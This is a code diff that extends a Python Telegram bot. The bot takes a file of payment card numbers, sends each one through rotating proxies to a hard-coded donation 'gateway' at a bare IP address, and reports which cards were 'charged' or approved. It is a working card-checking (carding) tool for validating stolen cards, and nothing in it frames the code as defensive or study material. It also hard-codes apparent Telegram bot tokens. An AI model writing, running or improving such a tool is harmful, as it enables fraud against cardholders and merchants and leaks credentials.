@@ -6,7 +6,7 @@ import string
 from datetime import datetime, timedelta
 import sys
 
-bot = TeleBot("7700737624:AAEKOb2kJFTN6g-Cod4vDphfpqlJSsjzoHU")
+bot = TeleBot("8663863938:AAHr0p7MNlaKDbZNVDgMD8QLVUOm7ZS79do")
 
 GATEWAY = "http://138.128.240.15:8025/paypal_donate?cc="
 
@@ -135,4 +135,72 @@ def handle_file(m):
     cards = [line.strip() for line in downloaded.decode('utf-8').splitlines() if line.strip()]
 
     if not cards:
-        bot.reply_to(m, "File empty hai
+        bot.reply_to(m, "File empty hai")
+        return
+
+    stop_flags[m.chat.id] = False
+    live = 0
+    dead = 0
+
+    progress_msg = bot.send_message(m.chat.id, "🔄 Starting fast check...")
+
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("🛑 Stop", callback_data="stop_check"))
+
+    print_log(f"Fast mass check started with {len(cards)} cards by user {m.from_user.id}")
+
+    for i, card in enumerate(cards):
+        if stop_flags.get(m.chat.id):
+            bot.edit_message_text("🛑 Stopped by user", m.chat.id, progress_msg.message_id)
+            print_log("Mass check stopped by user")
+            break
+
+        proxy = get_proxy()
+
+        bot.edit_message_text(
+            f"💳 **Current card:**\n`{card}`\n\n"
+            f"📊 **Status:** Checking...\n"
+            f"💎 **Charged:** {live}\n"
+            f"❌ **Declined:** {dead}\n"
+            f"📊 **Total:** {len(cards)}",
+            m.chat.id, progress_msg.message_id,
+            reply_markup=markup
+        )
+
+        try:
+            url = GATEWAY + card.replace(" ", "")
+            r = requests.get(url, proxies=proxy, timeout=12)
+            resp = r.text
+
+            if any(x in resp.lower() for x in ["charge", "charged", "approved", "success", "live"]):
+                live += 1
+                live_cards.append(card)
+                bot.send_message(m.chat.id, f"✅ **1$ Charged - Card Approved**\n{card}")
+                print_log(f"LIVE CARD: {card}")
+            else:
+                dead += 1
+                print_log(f"Declined: {card}")
+
+        except Exception as e:
+            dead += 1
+            print_log(f"Error on {card}: {e}")
+
+        time.sleep(0.5)
+
+    bot.edit_message_text(
+        f"✅ **CHECKING COMPLETE**\n\n"
+        f"💎 **Charged:** {live}\n"
+        f"❌ **Declined:** {dead}\n"
+        f"📊 **Total:** {len(cards)}",
+        m.chat.id, progress_msg.message_id
+    )
+
+    print_log(f"Mass check finished. Charged: {live} | Dead: {dead}")
+
+@bot.callback_query_handler(func=lambda call: call.data == "stop_check")
+def stop_check(call):
+    stop_flags[call.message.chat.id] = True
+    bot.answer_callback_query(call.id, "Stopping...")
+    print_log("Stop button pressed")
+
+bot.infinity_polling()
